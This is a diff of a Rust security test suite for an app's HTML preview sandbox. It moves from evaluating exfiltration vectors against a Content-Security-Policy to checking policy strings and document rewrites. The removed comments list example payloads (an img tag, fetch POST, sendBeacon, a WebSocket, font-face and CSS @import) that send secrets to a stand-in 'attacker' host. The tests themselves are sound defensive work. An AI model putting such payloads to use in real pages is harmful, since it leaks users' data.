@@ -1,203 +1,134 @@
-//! Preview security verification suite (lean scope, ADR-009/011 amended).
+//! Preview security verification suite (ADR-009 and ADR-011, amended by
+//! ADR-043).
 //!
-//! Two boundaries, two mechanisms:
+//! What this suite proves, and what proves the rest:
 //!
-//! 1. **Exfil denial is a CSP-semantics property.** A remote exfil request
-//!    (`https://attacker/`, `wss://…`) never reaches the `writ-preview://`
-//!    protocol handler — the webview's CSP enforcement blocks it before any
-//!    network or protocol dispatch — so the disposition recorder cannot
-//!    witness it. The boundary against exfil *is* the Content-Security-
-//!    Policy. This suite asserts that the **locked** document CSP
-//!    (`build_document_csp`) denies each of the six exfil vectors, using the
-//!    independently-validated [`csp_eval`] evaluator (see its oracle tests).
+//! 1. **The policy bytes.** `preview::csp` locks the document and chrome
+//!    policies for each platform, and `tests/app_csp_tests.rs` the app's
+//!    `frame-src`. Whether an engine enforces them is answered by the engine
+//!    probe (`tests/engine_probe.rs`), which fires every exfil vector at a
+//!    real WebKit, WebKit2GTK or WebView2 behind local sinks (ADR-043). This
+//!    suite asserts what the policy must always say.
 //!
-//! 2. **The scope/traversal boundary is what the recorder observes.** The
+//! 2. **The document rewrite.** Resource hints are disabled and frame
+//!    navigations disarmed before a document is served
+//!    (`writ_core::preview::hints` and `writ_core::preview::frames`, tested
+//!    against a spec tokenizer in that crate). Here, the documents the
+//!    renderers write themselves are shown to pass through both unchanged.
+//!
+//! 3. **The scope/traversal boundary is what the recorder observes.** The
 //!    handler genuinely receives `writ-preview://` URLs and decides
 //!    chrome-vs-document routing and traversal refusal. Those dispositions
 //!    are asserted via the debug-only request recorder against the real
 //!    `resolve()` pipeline.
-//!
-//! The six malicious vectors are also recorded as a documented corpus that
-//! seeds the `writ-preview://` URL-parser fuzz target and grounds the
-//! threat model (`docs/security/html-preview.md`).
 
-use writ_core::preview::AssetScope;
+use std::borrow::Cow;
+
+use writ_core::preview::frames::disarm_frame_navigations;
+use writ_core::preview::hints::neutralize_resource_hints;
+use writ_core::preview::{AssetScope, ContentRenderer, RenderRequest};
 use writ_tauri_lib::preview::csp::build_document_csp;
-use writ_tauri_lib::preview::csp_eval::{Csp, Directive, Resource, Verdict};
 use writ_tauri_lib::preview::embeds::IndexEmbeds;
 use writ_tauri_lib::preview::handler::{chrome_asset, resolve, RenderedDoc};
 use writ_tauri_lib::preview::protocol::{clear_records, drain_records, Disposition, RefusalReason};
+use writ_tauri_lib::preview::renderers::{HtmlRenderer, MarkdownRenderer};
 
-// --- 1. Exfil-denial suite: six vectors, denied by the locked CSP --------
+// --- 1. What the document policy must always say --------------------------
 
-/// Each exfil vector as the (directive, remote resource) a conformant
-/// engine evaluates when the document attempts it. The doc comment names
-/// the HTML/JS that triggers it — the documented fixture corpus.
-struct ExfilVector {
-    name: &'static str,
-    directive: Directive,
-    resource: Resource,
-}
-
-fn exfil_vectors() -> Vec<ExfilVector> {
-    vec![
-        // <img src="https://attacker/?secret">
-        ExfilVector {
-            name: "remote_img",
-            directive: Directive::Img,
-            resource: Resource::remote("https"),
-        },
-        // fetch('https://attacker/', { method: 'POST', body: secret })
-        ExfilVector {
-            name: "fetch",
-            directive: Directive::Connect,
-            resource: Resource::remote("https"),
-        },
-        // navigator.sendBeacon('https://attacker/', secret)
-        ExfilVector {
-            name: "send_beacon",
-            directive: Directive::Connect,
-            resource: Resource::remote("https"),
-        },
-        // new WebSocket('wss://attacker/')
-        ExfilVector {
-            name: "websocket",
-            directive: Directive::Connect,
-            resource: Resource::remote("wss"),
-        },
-        // @font-face { src: url('https://attacker/?secret') }
-        ExfilVector {
-            name: "remote_font_face",
-            directive: Directive::Font,
-            resource: Resource::remote("https"),
-        },
-        // <style>@import url('https://attacker/?secret')</style>
-        ExfilVector {
-            name: "remote_css_import",
-            directive: Directive::Style,
-            resource: Resource::remote("https"),
-        },
-    ]
+#[test]
+fn the_document_policy_shuts_the_network_and_sandboxes_the_frame() {
+    for scripts in [true, false] {
+        let csp = build_document_csp(scripts);
+        assert!(csp.contains("connect-src 'none'"), "{csp}");
+        assert!(csp.contains("form-action 'none'"), "{csp}");
+        assert!(csp.contains("frame-src 'none'"), "{csp}");
+        assert!(csp.contains("object-src 'none'"), "{csp}");
+        assert!(
+            csp.contains("sandbox allow-scripts allow-same-origin"),
+            "sandbox directive present: {csp}"
+        );
+        assert!(!csp.contains("allow-top-navigation"), "{csp}");
+        assert!(!csp.contains("allow-popups"), "{csp}");
+        assert!(!csp.contains("allow-forms"), "{csp}");
+    }
 }
 
 #[test]
-fn locked_csp_denies_every_exfil_vector_scripts_on() {
-    let csp = Csp::parse(&build_document_csp(true));
-    for v in exfil_vectors() {
-        assert_eq!(
-            csp.evaluate(v.directive, &v.resource),
-            Verdict::Deny,
-            "exfil vector `{}` must be denied under the locked CSP (scripts on)",
-            v.name
+fn only_an_opted_in_document_may_run_inline_script() {
+    let script_src = |scripts: bool| {
+        build_document_csp(scripts)
+            .split("; ")
+            .find(|clause| clause.starts_with("script-src"))
+            .expect("script-src")
+            .to_string()
+    };
+    assert!(script_src(true).contains("'unsafe-inline'"));
+    assert!(!script_src(false).contains("'unsafe-inline'"));
+    // The first-party runtimes load either way.
+    assert!(script_src(false).contains("'self'"));
+}
+
+// --- 2. The documents the renderers write survive the rewrite ------------
+
+fn request(content_type: writ_core::preview::ContentTypeId, text: &str) -> RenderRequest {
+    RenderRequest {
+        content_type,
+        buffer_text: text.to_string(),
+        theme: Default::default(),
+        zoom: 1.0,
+        assets: None,
+    }
+}
+
+/// A Markdown note with math (the KaTeX stylesheet link) and a Mermaid fence
+/// (its runtime), and an HTML file with its own stylesheet link.
+fn first_party_documents() -> [String; 2] {
+    let markdown = MarkdownRenderer::without_index()
+        .render(request(
+            MarkdownRenderer::content_type_id(),
+            "# Title\n\nInline $x^2$ and display:\n\n$$E=mc^2$$\n\n```mermaid\ngraph TD; A-->B\n```\n",
+        ))
+        .expect("markdown render")
+        .document_html;
+    let html = HtmlRenderer
+        .render(request(
+            HtmlRenderer::content_type_id(),
+            "<link rel=\"stylesheet\" href=\"site.css\"><h1>x</h1>",
+        ))
+        .expect("html render")
+        .document_html;
+    [markdown, html]
+}
+
+#[test]
+fn the_links_the_renderers_write_pass_the_hint_rewrite_unchanged() {
+    for document in first_party_documents() {
+        assert!(
+            document.to_ascii_lowercase().contains("<link"),
+            "the render carries no link to check: {document}"
+        );
+        assert!(
+            matches!(neutralize_resource_hints(&document), Cow::Borrowed(_)),
+            "a first-party link was rewritten: {document}"
         );
     }
 }
 
 #[test]
-fn locked_csp_denies_every_exfil_vector_scripts_off() {
-    // The kill switch only tightens script-src; the exfil directives
-    // (connect/img/font/style remote) are denied either way.
-    let csp = Csp::parse(&build_document_csp(false));
-    for v in exfil_vectors() {
-        assert_eq!(
-            csp.evaluate(v.directive, &v.resource),
-            Verdict::Deny,
-            "exfil vector `{}` must be denied under the locked CSP (scripts off)",
-            v.name
+fn the_documents_the_renderers_write_pass_the_frame_rewrite_unchanged() {
+    // The Markdown shell carries `<meta charset>`, a tag the rewrite reads.
+    let documents = first_party_documents();
+    assert!(
+        documents[0].to_ascii_lowercase().contains("<meta"),
+        "the Markdown render carries no meta tag to check: {}",
+        documents[0]
+    );
+    for document in documents {
+        assert!(
+            matches!(disarm_frame_navigations(&document), Cow::Borrowed(_)),
+            "a first-party document was rewritten: {document}"
         );
     }
-}
-
-#[test]
-fn http_is_denied_too_not_just_https() {
-    // Network is categorically off — plaintext http is no more permitted
-    // than https. (Belt-and-suspenders: the policy lists neither.)
-    let csp = Csp::parse(&build_document_csp(true));
-    assert_eq!(
-        csp.evaluate(Directive::Img, &Resource::remote("http")),
-        Verdict::Deny
-    );
-    assert_eq!(
-        csp.evaluate(Directive::Connect, &Resource::remote("http")),
-        Verdict::Deny
-    );
-    assert_eq!(
-        csp.evaluate(Directive::Connect, &Resource::remote("ws")),
-        Verdict::Deny
-    );
-}
-
-// --- Allow class: the policy's *permitted* sources are permitted ---------
-// A deny-everything evaluator would pass the deny class above and fail
-// here. This is what makes the deny class meaningful.
-
-#[test]
-fn locked_csp_allows_its_permitted_local_sources() {
-    let csp = Csp::parse(&build_document_csp(true));
-
-    // Inline images via data: and local images via writ-preview:.
-    assert_eq!(
-        csp.evaluate(Directive::Img, &Resource::remote("data")),
-        Verdict::Allow
-    );
-    assert_eq!(
-        csp.evaluate(Directive::Img, &Resource::remote("writ-preview")),
-        Verdict::Allow
-    );
-
-    // Fonts: data: and writ-preview:.
-    assert_eq!(
-        csp.evaluate(Directive::Font, &Resource::remote("data")),
-        Verdict::Allow
-    );
-    assert_eq!(
-        csp.evaluate(Directive::Font, &Resource::remote("writ-preview")),
-        Verdict::Allow
-    );
-
-    // Author inline styles render (that's the whole point of preview).
-    assert_eq!(
-        csp.evaluate(Directive::Style, &Resource::Inline),
-        Verdict::Allow
-    );
-}
-
-#[test]
-fn scripts_on_allows_inline_script_scripts_off_denies_it() {
-    let on = Csp::parse(&build_document_csp(true));
-    assert_eq!(
-        on.evaluate(Directive::Script, &Resource::Inline),
-        Verdict::Allow
-    );
-    assert_eq!(
-        on.evaluate(Directive::Script, &Resource::remote("writ-preview")),
-        Verdict::Allow
-    );
-
-    let off = Csp::parse(&build_document_csp(false));
-    assert_eq!(
-        off.evaluate(Directive::Script, &Resource::Inline),
-        Verdict::Deny
-    );
-    assert_eq!(
-        off.evaluate(Directive::Script, &Resource::remote("writ-preview")),
-        Verdict::Deny
-    );
-}
-
-#[test]
-fn even_with_scripts_on_the_network_stays_shut() {
-    // The defining property of the lean model: scripts run, but they have
-    // no egress. A script that calls fetch() hits connect-src 'none'.
-    let csp = Csp::parse(&build_document_csp(true));
-    assert_eq!(
-        csp.evaluate(Directive::Script, &Resource::Inline),
-        Verdict::Allow
-    );
-    assert_eq!(
-        csp.evaluate(Directive::Connect, &Resource::remote("https")),
-        Verdict::Deny
-    );
 }
 
 // --- 2. Scope/traversal boundary: what the recorder observes -------------
